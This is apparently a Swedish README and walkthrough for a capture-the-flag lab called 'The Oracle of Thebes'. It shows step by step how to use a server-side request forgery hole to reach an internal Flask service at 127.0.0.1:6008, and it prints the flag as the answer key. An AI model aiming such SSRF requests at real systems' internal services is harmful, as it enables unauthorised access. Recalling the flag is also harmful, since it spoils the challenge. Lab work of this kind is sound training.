## ᾝ9‍♂️ The Oracle of Thebes – SSRF Challenge

### 🌟 Mål:
Utnyttja en SSRF-sårbarhet för att komma åt en intern Flask-tjänst och få ut en flagga.

---

### ⭐ Steg-för-steg

#### ᾟ1 Steg 1 – Starta miljön
```bash
docker-compose up --build
```

#### 🌐 Steg 2 – Besök oraklet
Gå till:
```
http://localhost:8080
```

#### ⚖️ Steg 3 – Testa första URL:en
Fyll i i formuläret:
```
http://127.0.0.1:6008/
```
Du får svaret från den interna tjänsten ("Inner Sanctum")

#### 🤮 Steg 4 – Hitta hintar
Testa:
```
http://127.0.0.1:6008/robots.txt
```
Du ser: `Disallow: /admin/`

#### 🕵️‍♂️ Steg 5 – Utforska admin
Testa:
```
http://127.0.0.1:6008/admin/
```
Du får en ledtråd om gamla filer...

#### 🗂️ Steg 6 – Gå vidare till flaggarkivet
Testa:
```
http://127.0.0.1:6008/admin/flag/
```
En hint säger att en fil finns kvar.

#### 🔮 Steg 7 – Testa oracle-flag.txt
Prova:
```
http://127.0.0.1:6008/admin/flag/oracle-flag.txt
```

#### 🏆 Steg 8 – Få flaggan!
```
o24{Or4cle_gr4ts_fl46}
```

---

### 🔹 Tips:

- Du kan också testa med curl eller Burp:
```bash
curl http://127.0.0.1:6008/admin/flag/oracle-flag.txt
```

- Eller använda debug mode i orakelgränssnittet:
```
http://localhost:8080/?debug=1
```

---

### 📊 Struktur
```bash
SSRF/
├── docker-compose.yml
├── internal-api/        # SSRF-mål
└── oracle-web/          # Frontend (SSRF-ingång)
```

---

### 🌐 Flagga
```
o24{Or4cle_gr4ts_fl46}
```

